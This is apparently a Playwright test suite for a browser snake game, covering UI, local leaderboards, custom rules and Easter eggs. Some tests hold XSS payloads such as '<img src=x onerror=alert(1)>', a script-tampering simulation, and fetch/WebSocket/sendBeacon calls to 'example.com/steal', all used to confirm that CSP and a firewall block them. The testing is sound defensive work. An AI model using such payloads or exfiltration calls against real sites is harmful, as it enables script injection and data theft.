import { test, expect, type Page } from "@playwright/test";

const runtimeErrors = new WeakMap<Page, string[]>();

test.beforeEach(async ({ page }) => {
  const errors: string[] = [];
  runtimeErrors.set(page, errors);
  page.on("pageerror", (error) => errors.push(error.message));
  await page.goto("/");
  await page.evaluate(() => document.fonts.ready);
});

test.afterEach(async ({ page }) => {
  expect(runtimeErrors.get(page)).toEqual([]);
});

async function headCenter(page: Page) {
  return page.locator("canvas").evaluate((canvas: HTMLCanvasElement) => {
    const data = canvas
      .getContext("2d")!
      .getImageData(0, 0, canvas.width, canvas.height).data;
    let x = 0,
      y = 0,
      count = 0;
    for (let i = 0; i < data.length; i += 4) {
      if (data[i] !== 183 || data[i + 1] !== 235 || data[i + 2] !== 102)
        continue;
      x += (i / 4) % canvas.width;
      y += Math.floor(i / 4 / canvas.width);
      count++;
    }
    return { x: x / Math.max(1, count), y: y / Math.max(1, count) };
  });
}

async function useFastFatalRules(page: Page) {
  await page.evaluate(() =>
    localStorage.setItem(
      "bitarcade.snakebyte.v1.rules",
      JSON.stringify({
        startingLength: 7,
        minimumLength: 6,
        wallCost: 5,
        wallGraceMs: 0,
        speedEasyMs: 80,
        speedMediumMs: 80,
        speedHardMs: 80,
        speedRampPercent: 0,
      }),
    ),
  );
  await page.reload();
  await page.evaluate(() => document.fonts.ready);
}

test("start screen, manual, sound preference, difficulty, and fullscreen", async ({
  page,
}) => {
  await expect(page.getByRole("heading", { name: "Snakebyte" })).toBeVisible();
  await expect(
    page.getByRole("radio", { name: "Easy difficulty" }),
  ).toBeChecked();
  await page.getByRole("button", { name: "How to play" }).click();
  await expect(page.getByRole("dialog")).toBeVisible();
  await expect(page.getByText("Every bite counts.")).toBeVisible();
  await expect(page.getByText("Private by design.")).toBeVisible();
  await page.keyboard.press("Escape");
  await expect(page.getByRole("dialog")).not.toBeVisible();
  await page.getByRole("button", { name: "Mute sound" }).click();
  await page.getByRole("radio", { name: "Hard difficulty" }).click();
  await page.reload();
  await expect(
    page.getByRole("button", { name: "Enable sound" }),
  ).toBeVisible();
  await expect(
    page.getByRole("radio", { name: "Hard difficulty" }),
  ).toBeChecked();
  await page.getByRole("button", { name: "Enter fullscreen" }).click();
  await expect(page.locator(".cabinet")).toHaveClass(/is-expanded/);
  await page.getByRole("button", { name: "Exit fullscreen" }).click();
  await expect(page.locator(".cabinet")).not.toHaveClass(/is-expanded/);
});

test("light and dark themes toggle, apply globally, and persist", async ({
  page,
}) => {
  await expect(page.locator("html")).toHaveAttribute("data-theme", "dark");
  await expect(page.getByTestId("theme-toggle")).toBeVisible();
  await page.getByTestId("theme-toggle").click();
  await expect(page.locator("html")).toHaveAttribute("data-theme", "light");
  await expect(page.getByTestId("theme-toggle")).toContainText("Light mode");
  expect(
    await page.evaluate(() =>
      localStorage.getItem("bitarcade.snakebyte.v1.theme"),
    ),
  ).toBe('"light"');
  await expect(page.locator(".app")).toBeVisible();
  await page.reload();
  await expect(page.locator("html")).toHaveAttribute("data-theme", "light");
  await expect(page.getByTestId("theme-toggle")).toContainText("Light mode");
  await page.getByTestId("theme-toggle").click();
  await expect(page.locator("html")).toHaveAttribute("data-theme", "dark");
});

test("keyboard starts, turns, pauses, resumes, and restarts instantly", async ({
  page,
}) => {
  await page.keyboard.press("Space");
  await expect(page.getByTestId("score")).toHaveText("00010");
  const center = await headCenter(page);
  await page.keyboard.press("ArrowUp");
  await expect
    .poll(async () => (await headCenter(page)).y)
    .toBeLessThan(center.y - 5);
  await page.keyboard.press("a");
  await page.keyboard.press("Space");
  await expect(
    page.getByRole("heading", { name: "Paused", exact: true }),
  ).toBeVisible();
  const stopped = await headCenter(page);
  await page.waitForTimeout(400);
  expect(await headCenter(page)).toEqual(stopped);
  await page.getByRole("button", { name: "Resume", exact: true }).click();
  await expect(page.locator(".game-screen")).toHaveClass(/phase-playing/);
  await page.keyboard.press("r");
  await expect(page.getByTestId("score")).toHaveText("00000");
  await page.getByRole("button", { name: "Pause game" }).click();
  await page.getByRole("button", { name: "Back to title" }).click();
  await expect(
    page.getByRole("button", { name: "Start game", exact: true }),
  ).toBeVisible();
});

test("completed runs are saved to the local leaderboard and persist", async ({
  page,
}) => {
  await useFastFatalRules(page);
  await page.getByRole("radio", { name: "Medium difficulty" }).click();
  await page.keyboard.press("Space");
  await expect(page.getByTestId("score")).toHaveText("00020");
  // A straight line into the wall ends the run under these custom rules.
  await expect(page.getByRole("heading", { name: "Game over" })).toBeVisible({
    timeout: 5000,
  });
  const score = await page.getByTestId("score").innerText();
  await expect(page.getByText("New personal best")).toBeVisible();
  await expect(page.getByText("Top of the board")).toBeVisible();

  const sideBoard = page.getByTestId("side-leaderboard");
  await expect(sideBoard).toContainText("Medium");
  await expect(sideBoard).toContainText(score);

  const saved = await page.evaluate(() =>
    JSON.parse(localStorage.getItem("bitarcade.snakebyte.v1.scores") || "[]"),
  );
  expect(saved[0].mode).toBe("medium");
  expect(saved[0].apples).toBeGreaterThan(0);
  expect(saved[0].score).toBeGreaterThanOrEqual(20);

  await page.getByRole("button", { name: "Play again" }).click();
  await expect(page.getByTestId("score")).toHaveText("00000");
  await page.reload();
  await expect(page.getByTestId("best")).toHaveText(score);
  await expect(page.getByTestId("side-leaderboard")).toContainText(score);
});

test("the leaderboard is local-only with no live or network features", async ({
  page,
}) => {
  const text = (await page.locator("body").innerText()).toLowerCase();
  expect(text).toContain("leaderboard");
  expect(text).not.toMatch(/live ladder|join ladder|top 20|live now|realtime/);
  await expect(page.getByTestId("side-leaderboard")).toBeVisible();
  await expect(page.locator("table").first()).toBeVisible();
  await expect(page.getByTestId("network-status")).toHaveCount(0);
  await expect(page.getByTestId("integrity-status")).toHaveText(
    /Sealed build|Reset mode/,
  );
  await expect(page.getByText("Private to this browser")).toBeVisible();
  const csp = await page
    .locator('meta[http-equiv="Content-Security-Policy"]')
    .getAttribute("content");
  expect(csp).toContain("connect-src 'none'");
  expect(csp).not.toContain("wss:");
  expect(csp).not.toContain("'unsafe-eval'");
  expect(csp).toContain("object-src 'none'");
  expect(csp).toContain("base-uri 'none'");
  expect(csp).toContain("form-action 'none'");
  expect(csp).toContain("frame-src 'none'");
  expect(csp).toContain("worker-src 'none'");
  expect(csp).toContain("script-src-attr 'none'");
  expect(csp).toContain("require-trusted-types-for 'script'");
  expect(csp).toContain("trusted-types 'none'");
  const scripts = await page
    .locator("script")
    .evaluateAll((nodes) =>
      nodes.map((node) => (node as HTMLScriptElement).src).filter(Boolean),
    );
  const origin = new URL(page.url()).origin;
  expect(scripts.every((src) => new URL(src).origin === origin)).toBe(true);
});

test("local scores survive cleanup while old network records are removed", async ({
  page,
}) => {
  await page.evaluate(() => {
    localStorage.setItem(
      "bitarcade.snakebyte.v1.scores",
      JSON.stringify([
        {
          id: "kept-local-run",
          score: 240,
          mode: "hard",
          apples: 6,
          date: Date.now() - 60_000,
        },
      ]),
    );
    localStorage.setItem(
      "bitarcade.snakebyte.v1.liveEntries",
      JSON.stringify({ entries: [{ tag: "HAX", score: 99999 }] }),
    );
    localStorage.setItem(
      "bitarcade.snakebyte.v1.liveProfile",
      JSON.stringify({ tag: "HAX" }),
    );
  });
  await page.reload();
  await page.evaluate(() => document.fonts.ready);
  const remaining = await page.evaluate(() =>
    Object.keys(localStorage).filter((key) => key.startsWith("bitarcade.")),
  );
  expect(remaining).toContain("bitarcade.snakebyte.v1.scores");
  expect(remaining).not.toContain("bitarcade.snakebyte.v1.liveEntries");
  expect(remaining).not.toContain("bitarcade.snakebyte.v1.liveProfile");
  await expect(page.getByTestId("side-leaderboard")).toContainText("00240");
});

test("full leaderboard filters, hotkey, and guarded clear work", async ({
  page,
}) => {
  await page.evaluate(() => {
    const now = Date.now();
    localStorage.setItem(
      "bitarcade.snakebyte.v1.scores",
      JSON.stringify([
        {
          id: "run-easy",
          score: 110,
          mode: "easy",
          apples: 9,
          date: now - 120_000,
        },
        {
          id: "run-hard",
          score: 480,
          mode: "hard",
          apples: 12,
          date: now - 60_000,
        },
        {
          id: "run-medium",
          score: 280,
          mode: "medium",
          apples: 10,
          date: now,
        },
      ]),
    );
  });
  await page.reload();
  await page.keyboard.press("h");
  const board = page.getByTestId("local-leaderboard-dialog");
  await expect(board).toBeVisible();
  await expect(
    board.getByRole("heading", { name: "Leaderboard", exact: true }),
  ).toBeVisible();
  await expect(board.getByText("Personal best")).toBeVisible();
  await expect(board.getByText("00300")).toHaveCount(0);
  await expect(board.locator("tbody tr")).toHaveCount(3);
  await board.getByRole("button", { name: "Hard", exact: true }).click();
  await expect(board.locator("tbody tr")).toHaveCount(1);
  await expect(board.locator("tbody tr").first()).toContainText("Hard");
  await board.getByRole("button", { name: "All", exact: true }).click();
  await board.getByRole("button", { name: "Clear", exact: true }).click();
  await expect(board.getByRole("alert")).toContainText(
    "Clear all 3 saved runs",
  );
  await board.getByRole("button", { name: "Clear scores" }).click();
  await expect(board.getByText("Your first run sets the pace.")).toBeVisible();
  expect(
    await page.evaluate(() =>
      localStorage.getItem("bitarcade.snakebyte.v1.scores"),
    ),
  ).toBeNull();
  await page.getByRole("button", { name: "Close dialog" }).click();
  await expect(page.getByTestId("side-leaderboard")).not.toContainText("00480");
  await page.reload();
  await expect(page.getByTestId("best")).toHaveText("00000");
});

test("manual and mode changes safely pause a live run", async ({ page }) => {
  await page.getByRole("button", { name: "Start game", exact: true }).click();
  await page.getByRole("button", { name: "How to play" }).click();
  await expect(page.locator(".game-screen")).toHaveClass(/phase-paused/);
  await page.getByRole("button", { name: "Got it" }).click();
  await expect(page.locator(".game-screen")).toHaveClass(/phase-playing/);
  await page.getByRole("radio", { name: "Hard difficulty" }).click();
  await expect(
    page.getByRole("heading", { name: "Switch mode?" }),
  ).toBeVisible();
  await page.getByRole("button", { name: "Keep this run" }).click();
  await expect(
    page.getByRole("radio", { name: "Easy difficulty" }),
  ).toBeChecked();
  await page.getByRole("radio", { name: "Hard difficulty" }).click();
  await page.getByRole("button", { name: "Start Hard", exact: true }).click();
  await expect(
    page.getByRole("radio", { name: "Hard difficulty" }),
  ).toBeChecked();
  await expect(page.getByTestId("score")).toHaveText("00030");
  await page.evaluate(() => window.dispatchEvent(new Event("blur")));
  await expect(page.locator(".game-screen")).toHaveClass(/phase-paused/);
});

test("invalid or unavailable local storage never prevents play", async ({
  page,
}) => {
  await page.evaluate(() => {
    localStorage.setItem("bitarcade.snakebyte.v1.scores", "{not JSON");
    localStorage.setItem("bitarcade.snakebyte.v1.mode", '"not-a-mode"');
    localStorage.setItem(
      "bitarcade.snakebyte.v1.snakeColor",
      '"javascript:alert(1)"',
    );
  });
  await page.reload();
  await expect(page.getByTestId("best")).toHaveText("00000");
  await expect(page.getByTestId("snake-color-custom")).toHaveValue("#b7eb66");
  await expect(
    page.getByRole("radio", { name: "Easy difficulty" }),
  ).toBeChecked();
  await page.addInitScript(() =>
    Object.defineProperty(window, "localStorage", {
      get() {
        throw new Error("Storage unavailable");
      },
    }),
  );
  await page.reload();
  await page.getByRole("button", { name: "Start game", exact: true }).click();
  await expect(page.getByTestId("score")).toHaveText("00010");
});

test("scores that do not match real gameplay are rejected from local storage", async ({
  page,
}) => {
  await page.evaluate(() => {
    const now = Date.now();
    const entries = [
      {
        id: "valid-hard-001",
        score: 240,
        mode: "hard",
        apples: 6,
        date: now - 60_000,
      },
      {
        id: "edited-score-01",
        score: 99_990,
        mode: "hard",
        apples: 6,
        date: now - 60_000,
      },
      {
        id: "future-date-01",
        score: 240,
        mode: "hard",
        apples: 6,
        date: now + 3_600_000,
      },
      {
        id: "ancient-date-1",
        score: 240,
        mode: "hard",
        apples: 6,
        date: 1,
      },
      {
        id: "<img src=x onerror=alert(1)>",
        score: 240,
        mode: "hard",
        apples: 6,
        date: now,
      },
      {
        id: "too-many-apples",
        score: 240,
        mode: "hard",
        apples: 999,
        date: now,
      },
      {
        id: "valid-medium-001",
        score: 280,
        mode: "medium",
        apples: 10,
        date: now - 120_000,
      },
    ];
    localStorage.setItem(
      "bitarcade.snakebyte.v1.scores",
      JSON.stringify(entries),
    );
  });
  await page.reload();
  await expect(page.getByTestId("side-leaderboard")).toContainText("00280");
  await expect(page.getByTestId("side-leaderboard")).toContainText("00240");
  await expect(page.getByTestId("side-leaderboard")).not.toContainText("99990");
  await page.keyboard.press("h");
  await expect(page.locator(".board-table tbody tr")).toHaveCount(2);
  await expect(page.getByTestId("local-leaderboard-dialog")).not.toContainText(
    "edited-score",
  );
  await expect(page.locator("img[src='x']")).toHaveCount(0);
});

test("changing delivered code resets local progress before the game boots", async ({
  page,
}) => {
  await page.evaluate(() => {
    const now = Date.now();
    localStorage.setItem(
      "bitarcade.snakebyte.v1.scores",
      JSON.stringify([
        {
          id: "pre-tamper-run",
          score: 240,
          mode: "hard",
          apples: 6,
          date: now - 60_000,
        },
      ]),
    );
    localStorage.setItem("bitarcade.snakebyte.v1.mode", '"hard"');
    localStorage.setItem("bitarcade.snakebyte.v1.snakeColor", '"#3366ff"');
  });
  await page.reload();
  await expect(page.getByTestId("side-leaderboard")).toContainText("00240");
  await expect(page.getByTestId("snake-color-custom")).toHaveValue("#3366ff");
  await expect(page.getByTestId("integrity-reset")).toHaveCount(0);

  // Simulate a basic attacker changing one piece of delivered JavaScript.
  await page.route("http://127.0.0.1:4173/", async (route) => {
    const response = await route.fetch();
    const body = await response.text();
    await route.fulfill({
      response,
      body: body.replace(
        '<script type="module" crossorigin>',
        '<script type="module" crossorigin>/*tampered*/',
      ),
    });
  });
  await page.reload();
  await expect(page.getByTestId("integrity-reset")).toBeVisible();
  await expect(page.getByTestId("side-leaderboard")).not.toContainText("00240");
  expect(
    await page.evaluate(() =>
      localStorage.getItem("bitarcade.snakebyte.v1.scores"),
    ),
  ).toBeNull();
  expect(
    await page.evaluate(() =>
      localStorage.getItem("bitarcade.snakebyte.v1.integrityBaseline"),
    ),
  ).toBeNull();
  await expect(
    page.getByRole("radio", { name: "Easy difficulty" }),
  ).toBeChecked();
  await expect(page.getByTestId("snake-color-custom")).toHaveValue("#b7eb66");
  await expect(page.getByRole("button", { name: "Mute music" })).toBeVisible();
  expect(
    await page.evaluate(() =>
      localStorage.getItem("bitarcade.snakebyte.v1.rules"),
    ),
  ).toBeNull();
  // Untrusted sessions cannot write new scores.
  await page.getByRole("button", { name: "Start game", exact: true }).click();
  await expect(page.getByTestId("score")).toHaveText("00010");
  await page.getByRole("button", { name: "Pause game" }).click();
  await page.getByRole("button", { name: "Back to title" }).click();
  expect(
    await page.evaluate(() =>
      localStorage.getItem("bitarcade.snakebyte.v1.scores"),
    ),
  ).toBeNull();
});

test("a newly sealed build resets progress carried from an older build", async ({
  page,
}) => {
  await page.evaluate(() => {
    localStorage.setItem(
      "bitarcade.snakebyte.v1.integrityBaseline",
      "e".repeat(64),
    );
    localStorage.setItem(
      "bitarcade.snakebyte.v1.scores",
      JSON.stringify([
        {
          id: "old-build-run",
          score: 240,
          mode: "hard",
          apples: 6,
          date: Date.now() - 60_000,
        },
      ]),
    );
    localStorage.setItem("bitarcade.snakebyte.v1.mode", '"hard"');
  });
  await page.reload();
  await expect(page.getByTestId("integrity-reset")).toBeVisible();
  await expect(page.getByTestId("side-leaderboard")).not.toContainText("00240");
  await expect(
    page.getByRole("radio", { name: "Easy difficulty" }),
  ).toBeChecked();
  expect(
    await page.evaluate(() =>
      localStorage.getItem("bitarcade.snakebyte.v1.scores"),
    ),
  ).toBeNull();
});

// CSP and Trusted Types must block outbound requests and string-to-HTML sinks.
test("the page cannot reach the network or inject markup", async ({ page }) => {
  const external: string[] = [];
  page.on("request", (request) => {
    const hostname = new URL(request.url()).hostname;
    if (hostname !== "127.0.0.1" && hostname !== "localhost")
      external.push(request.url());
  });
  await page.reload();
  await page.evaluate(() => document.fonts.ready);
  expect(external).toEqual([]);
  const result = await page.evaluate(async () => {
    let fetchBlocked = false;
    try {
      await fetch("https://example.com/steal");
    } catch {
      fetchBlocked = true;
    }
    let imageBlocked = false;
    const image = new Image();
    const loaded = new Promise<boolean>((resolve) => {
      image.onload = () => resolve(true);
      image.onerror = () => resolve(false);
    });
    image.src = "https://example.com/pixel.png";
    try {
      imageBlocked = !(await Promise.race([
        loaded,
        new Promise<boolean>((resolve) =>
          setTimeout(() => resolve(false), 1_500),
        ),
      ]));
    } catch {
      imageBlocked = true;
    }
    let innerHtmlBlocked = false;
    try {
      const host = document.createElement("div");
      host.innerHTML = "<img src=x onerror=alert(1)>";
    } catch {
      innerHtmlBlocked = true;
    }
    return { fetchBlocked, imageBlocked, innerHtmlBlocked };
  });
  expect(result).toEqual({
    fetchBlocked: true,
    imageBlocked: true,
    innerHtmlBlocked: true,
  });
});

test("the application firewall denies outbound browser APIs and foreign storage", async ({
  page,
}) => {
  await expect(page.getByTestId("firewall-status")).toContainText("Firewall");
  const results = await page.evaluate(() => {
    const capture = (name: string, action: () => unknown) => {
      try {
        action();
        return [name, "allowed"];
      } catch (error) {
        return [name, String(error)];
      }
    };
    return Object.fromEntries([
      capture("fetch", () => window.fetch("https://example.com/steal")),
      capture("xhr", () => new XMLHttpRequest()),
      capture("websocket", () => new WebSocket("wss://example.com")),
      capture(
        "eventsource",
        () => new EventSource("https://example.com/events"),
      ),
      capture("beacon", () =>
        navigator.sendBeacon?.("https://example.com/collect", "data"),
      ),
      capture("open", () => window.open("https://example.com", "_blank")),
      capture("foreign-storage", () => localStorage.setItem("foreign", "x")),
      capture("storage-clear", () => localStorage.clear()),
    ]) as Record<string, string>;
  });
  expect(Object.keys(results)).toHaveLength(8);
  for (const [api, message] of Object.entries(results)) {
    expect(message, `${api} should be denied`).toContain(
      "Blocked by Snakebyte firewall",
    );
  }
});

test("returning to the title restores the opening snake and pace", async ({
  page,
}) => {
  await page.getByRole("button", { name: "Start game", exact: true }).click();
  await page.getByRole("button", { name: "Pause game" }).click();
  await page.getByRole("button", { name: "Back to title" }).click();
  await expect(page.locator(".run-mini-stats")).toContainText(/length\s*07/i);
  await expect(page.locator(".run-mini-stats")).toContainText(/pace\s*7\/s/i);
  await expect(page.locator(".run-mini-stats")).toContainText(
    /fragments\s*04/i,
  );
  await expect(
    page.getByRole("button", { name: "Start game", exact: true }),
  ).toBeVisible();
});

test("snake color can be customized, applied live, and persisted", async ({
  page,
}) => {
  await expect(page.getByTestId("snake-color-lime")).toHaveAttribute(
    "aria-pressed",
    "true",
  );
  await page.keyboard.press("c");
  await expect(page.getByTestId("snake-color-mint")).toHaveAttribute(
    "aria-pressed",
    "true",
  );
  await page.getByTestId("snake-color-reset").click();
  await expect(page.getByTestId("snake-color-lime")).toHaveAttribute(
    "aria-pressed",
    "true",
  );

  await page.getByRole("button", { name: "Start game", exact: true }).click();
  await page.getByRole("button", { name: "Pause game" }).click();
  const redPixels = () =>
    page.locator("canvas").evaluate((canvas: HTMLCanvasElement) => {
      const pixels = canvas
        .getContext("2d")!
        .getImageData(0, 0, canvas.width, canvas.height).data;
      let red = 0;
      for (let i = 0; i < pixels.length; i += 4) {
        const r = pixels[i];
        const g = pixels[i + 1];
        const b = pixels[i + 2];
        if (r > 150 && r > g + 25 && r > b + 25) red++;
      }
      return red;
    });
  const before = await redPixels();
  await page.getByTestId("snake-color-coral").click();
  await expect.poll(redPixels).toBeGreaterThan(before + 100);
  await expect(page.getByTestId("snake-color-name")).toHaveText("Coral");

  await page.getByTestId("snake-color-custom").evaluate((element) => {
    const input = element as HTMLInputElement;
    input.value = "#3366ff";
    input.dispatchEvent(new Event("input", { bubbles: true }));
    input.dispatchEvent(new Event("change", { bubbles: true }));
  });
  await expect(page.getByTestId("snake-color-hex")).toHaveText(/#3366ff/i);
  await expect(page.getByTestId("snake-color-name")).toHaveText("Custom");
  expect(
    await page.evaluate(() =>
      localStorage.getItem("bitarcade.snakebyte.v1.snakeColor"),
    ),
  ).toBe('"#3366ff"');
  await page.reload();
  await expect(page.getByTestId("snake-color-custom")).toHaveValue("#3366ff");
  await expect(page.getByTestId("snake-color-hex")).toHaveText(/#3366ff/i);
});

test("Konami code unlocks the rainbow Easter egg", async ({ page }) => {
  await page.getByRole("button", { name: "Start game", exact: true }).click();
  await page.getByRole("button", { name: "Pause game" }).click();
  for (const key of [
    "ArrowUp",
    "ArrowUp",
    "ArrowDown",
    "ArrowDown",
    "ArrowLeft",
    "ArrowRight",
    "ArrowLeft",
    "ArrowRight",
    "b",
    "a",
  ])
    await page.keyboard.press(key);
  await expect(page.getByTestId("easter-egg-toast")).toContainText(
    /rainbow run/i,
  );
  await expect(page.getByTestId("easter-egg-title")).toHaveText(/rainbow run/i);
});

test("secret word and rapid title taps reveal hidden cabinet messages", async ({
  page,
}) => {
  await page.keyboard.type("byte");
  await expect(page.getByTestId("easter-egg-toast")).toContainText(
    /byte unlocked/i,
  );
  await page.reload();
  const title = page.getByTestId("secret-title");
  for (let count = 0; count < 7; count++) await title.click();
  await expect(page.getByTestId("easter-egg-toast")).toContainText(
    /pixel party/i,
  );
});

test("selecting every palette in order unlocks Chroma Master", async ({
  page,
}) => {
  for (const id of [
    "lime",
    "mint",
    "cyan",
    "blue",
    "violet",
    "magenta",
    "coral",
    "gold",
  ])
    await page.getByTestId(`snake-color-${id}`).click();
  await expect(page.getByTestId("easter-egg-toast")).toContainText(
    /chroma master/i,
  );
});

test("wall hit costs a fragment and grants a grace period", async ({
  page,
}) => {
  await page.getByRole("button", { name: "Start game", exact: true }).click();
  await expect(page.getByTestId("grace-status")).toBeVisible({ timeout: 6000 });
  await expect(page.getByTestId("grace-status")).toContainText(/grace active/i);
  await expect(page.locator(".game-screen")).toHaveClass(/phase-playing/);
  await expect(page.locator(".run-mini-stats")).toContainText(/fragments/i);
});

test("music can be toggled separately from sound effects and persists", async ({
  page,
}) => {
  await expect(page.getByRole("button", { name: "Mute music" })).toBeVisible();
  await page.getByRole("button", { name: "Mute music" }).click();
  await expect(
    page.getByRole("button", { name: "Enable music" }),
  ).toBeVisible();
  await expect(page.getByRole("button", { name: "Mute sound" })).toBeVisible();
  expect(
    await page.evaluate(() =>
      localStorage.getItem("bitarcade.snakebyte.v1.music"),
    ),
  ).toBe("false");
  await page.reload();
  await expect(
    page.getByRole("button", { name: "Enable music" }),
  ).toBeVisible();
  await page.getByRole("button", { name: "Enable music" }).click();
  await expect(page.getByRole("button", { name: "Mute music" })).toBeVisible();
  expect(
    await page.evaluate(() =>
      localStorage.getItem("bitarcade.snakebyte.v1.music"),
    ),
  ).toBe("true");
});

test("the in-game fruit is visually oversized", async ({ page }) => {
  await page.getByRole("button", { name: "Start game", exact: true }).click();
  await page.waitForTimeout(650);
  const fruit = await page
    .locator("canvas")
    .evaluate((element: HTMLCanvasElement) => {
      const canvas = element;
      const w = canvas.width;
      const h = canvas.height;
      const pixels = canvas.getContext("2d")!.getImageData(0, 0, w, h).data;
      const red = new Uint8Array(w * h);
      for (let i = 0; i < red.length; i++) {
        const p = i * 4;
        const r = pixels[p];
        const g = pixels[p + 1];
        const b = pixels[p + 2];
        if (r > 170 && g < 165 && b < 155 && r - g > 45 && r - b > 45)
          red[i] = 1;
      }
      const seen = new Uint8Array(w * h);
      const qx = new Int32Array(w * h);
      const qy = new Int32Array(w * h);
      let largest = 0;
      let largestWidth = 0;
      let largestHeight = 0;
      for (let y = 0; y < h; y++) {
        for (let x = 0; x < w; x++) {
          const start = y * w + x;
          if (!red[start] || seen[start]) continue;
          let head = 0;
          let tail = 0;
          qx[tail] = x;
          qy[tail] = y;
          tail++;
          seen[start] = 1;
          let count = 0;
          let minX = w;
          let maxX = 0;
          let minY = h;
          let maxY = 0;
          while (head < tail) {
            const cx = qx[head];
            const cy = qy[head];
            head++;
            count++;
            if (cx < minX) minX = cx;
            if (cx > maxX) maxX = cx;
            if (cy < minY) minY = cy;
            if (cy > maxY) maxY = cy;
            for (let dy = -1; dy <= 1; dy++) {
              for (let dx = -1; dx <= 1; dx++) {
                const nx = cx + dx;
                const ny = cy + dy;
                if (nx < 0 || ny < 0 || nx >= w || ny >= h) continue;
                const next = ny * w + nx;
                if (!red[next] || seen[next]) continue;
                seen[next] = 1;
                qx[tail] = nx;
                qy[tail] = ny;
                tail++;
              }
            }
          }
          if (count > largest) {
            largest = count;
            largestWidth = maxX - minX + 1;
            largestHeight = maxY - minY + 1;
          }
        }
      }
      const cell = Math.min(w / 30, h / 18);
      return {
        scale: Number(canvas.dataset.fruitScale),
        cell,
        largest,
        width: largestWidth,
        height: largestHeight,
      };
    });
  expect(fruit.scale).toBeGreaterThan(1.5);
  expect(fruit.width).toBeGreaterThan(fruit.cell * 0.9);
  expect(fruit.height).toBeGreaterThan(fruit.cell * 0.7);
  expect(fruit.largest).toBeGreaterThan(fruit.cell * fruit.cell * 0.5);
});

test("game rules offer exact control of speed, money, length, and grace", async ({
  page,
}) => {
  await page.getByRole("button", { name: "Game rules" }).click();
  await expect(page.getByTestId("rules-dialog")).toBeVisible();
  for (const group of ["speed", "money", "length", "grace"])
    await expect(page.getByTestId(`rules-group-${group}`)).toBeVisible();

  const setExact = async (key: string, value: string) => {
    await page.getByTestId(`rules-${key}-number`).fill(value);
  };
  await setExact("moneyEasy", "37");
  await setExact("moneyMedium", "40");
  await setExact("moneyHard", "50");
  await setExact("goldenEvery", "4");
  await setExact("speedEasyMs", "40");
  await setExact("speedMediumMs", "80");
  await setExact("speedHardMs", "120");
  await setExact("speedRampPercent", "0");
  await setExact("startingLength", "10");
  await setExact("maxLength", "20");
  await setExact("minimumLength", "9");
  await setExact("growthPerApple", "2");
  await setExact("wallCost", "5");
  await setExact("wallGraceMs", "1234");

  await expect(page.getByTestId("rules-moneyEasy-value")).toContainText(
    "37 coins",
  );
  await expect(page.getByTestId("rules-speedEasyMs-value")).toContainText(
    "40 ms",
  );
  await expect(page.getByTestId("rules-startingLength-value")).toContainText(
    "10 seg",
  );
  await expect(page.getByTestId("rules-wallGraceMs-value")).toContainText(
    "1.23s",
  );
  await expect(page.getByTestId("rules-active-label")).toHaveText("Custom");
  await expect(page.getByTestId("golden-pips")).toHaveAttribute(
    "aria-valuemax",
    "4",
  );
  await expect(page.getByTestId("golden-pips").locator("i")).toHaveCount(4);
  await expect(page.getByTestId("golden-countdown")).toHaveText("In 4");

  // A zero grace value makes the game-over check quick and deterministic.
  await setExact("wallGraceMs", "0");
  await expect(page.getByTestId("rules-wallGraceMs-value")).toContainText(
    "0.00s",
  );
  await page.getByTestId("rules-done").click();
  await expect(page.getByTestId("rules-dialog")).toHaveCount(0);
  await expect
    .poll(async () =>
      page.evaluate(() => document.activeElement?.getAttribute("class") ?? ""),
    )
    .toContain("game-screen");

  await page.getByRole("button", { name: "Start game", exact: true }).click();
  await expect
    .poll(async () => Number(await page.getByTestId("score").innerText()))
    .toBeGreaterThanOrEqual(37);
  await expect(page.getByTestId("rules-money-live")).toHaveText("37");
  await expect(page.getByTestId("rules-status")).toContainText(
    "37 coins/apple",
  );
  await expect(page.locator(".run-mini-stats")).toContainText(/pace\s*25\/s/i);
  await expect(page.getByRole("heading", { name: "Game over" })).toBeVisible({
    timeout: 10000,
  });

  const saved = await page.evaluate(() =>
    JSON.parse(localStorage.getItem("bitarcade.snakebyte.v1.scores") || "[]"),
  );
  expect(saved[0].mode).toBe("easy");
  expect(saved[0].apples).toBeGreaterThan(0);
  expect(saved[0].score).toBeGreaterThan(0);
  expect(saved[0].rules).toMatchObject({
    moneyEasy: 37,
    speedEasyMs: 40,
    speedRampPercent: 0,
    startingLength: 10,
    maxLength: 20,
    minimumLength: 9,
    growthPerApple: 2,
    wallCost: 5,
    wallGraceMs: 0,
  });

  await page.reload();
  await page.keyboard.press("g");
  await expect(page.getByTestId("rules-dialog")).toBeVisible();
  await expect(page.getByTestId("rules-moneyEasy-value")).toContainText(
    "37 coins",
  );
  await expect(page.getByTestId("rules-speedEasyMs-value")).toContainText(
    "40 ms",
  );
  await expect(page.getByTestId("rules-startingLength-value")).toContainText(
    "10 seg",
  );
  await page.getByTestId("rules-reset").click();
  await expect(page.getByTestId("rules-moneyEasy-value")).toContainText(
    "10 coins",
  );
  await expect(page.getByTestId("rules-speedEasyMs-value")).toContainText(
    "148 ms",
  );
  await expect(page.getByTestId("rules-active-label")).toHaveText("Classic");
});

test("WASD steers while color and rule controls retain focus", async ({
  page,
}) => {
  await page.getByRole("button", { name: "Start game", exact: true }).click();
  const focusColor = async () => {
    await page.getByTestId("snake-color-custom").focus();
    expect(
      await page.evaluate(() => document.activeElement?.getAttribute("type")),
    ).toBe("color");
  };

  await focusColor();
  const beforeW = await headCenter(page);
  await page.keyboard.press("w");
  await expect
    .poll(async () => (await headCenter(page)).y)
    .toBeLessThan(beforeW.y - 8);

  await page.keyboard.press("r");
  await page.waitForTimeout(80);
  await focusColor();
  const beforeS = await headCenter(page);
  await page.keyboard.press("s");
  await expect
    .poll(async () => (await headCenter(page)).y)
    .toBeGreaterThan(beforeS.y + 8);

  await page.keyboard.press("r");
  await page.waitForTimeout(80);
  await focusColor();
  const beforeD = await headCenter(page);
  await page.keyboard.press("d");
  await expect
    .poll(async () => (await headCenter(page)).x)
    .toBeGreaterThan(beforeD.x + 8);

  await page.keyboard.press("r");
  await page.waitForTimeout(80);
  await focusColor();
  const beforeUp = await headCenter(page);
  await page.keyboard.press("w");
  await expect
    .poll(async () => (await headCenter(page)).y)
    .toBeLessThan(beforeUp.y - 8);
  const beforeA = await headCenter(page);
  await focusColor();
  await page.keyboard.press("a");
  await expect
    .poll(async () => (await headCenter(page)).x)
    .toBeLessThan(beforeA.x - 8);

  await page.getByRole("button", { name: "Game rules" }).click();
  const slider = page.getByTestId("rules-moneyEasy");
  await slider.focus();
  await page.keyboard.press("ArrowRight");
  await expect(slider).toHaveValue("11");
  await page.getByTestId("rules-done").click();
  await expect
    .poll(async () =>
